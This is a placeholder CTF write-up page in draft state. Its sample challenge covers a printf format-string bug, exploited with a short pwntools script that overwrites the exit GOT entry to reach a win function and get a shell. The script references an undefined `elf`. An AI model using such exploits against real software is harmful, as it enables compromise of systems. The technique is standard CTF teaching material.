---
draft: true  # hidden until there is real content
title: "Example CTF: Format string to shell"
date: 2026-11-10
tags: ["ctf", "pwn", "placeholder"]
description: "PLACEHOLDER writeup showing the layout for CTF solutions."
---

{{< todo >}}Sample writeup. Replace it with a real one, or delete this file once you have your own.{{< /todo >}}

**Challenge:** `fmt` · **Category:** pwn · **Event:** Example CTF 2026

## Recon

```text
$ checksec ./fmt
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

The binary passes user input directly to `printf`, giving us an arbitrary read and write.

## Exploit

```python
from pwn import *

p = process("./fmt")
payload = fmtstr_payload(6, {elf.got["exit"]: elf.sym["win"]})
p.sendline(payload)
p.interactive()
```

## Takeaways

Partial RELRO plus no PIE makes GOT overwrite the shortest path.
